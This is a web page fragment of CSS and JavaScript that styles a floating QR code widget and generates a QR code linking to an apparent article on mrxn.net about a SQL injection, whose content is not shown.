.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

手机扫码阅读



var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/windor-Module-BPCJ-AD\_Tag-Controller-ADTag\_Info-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});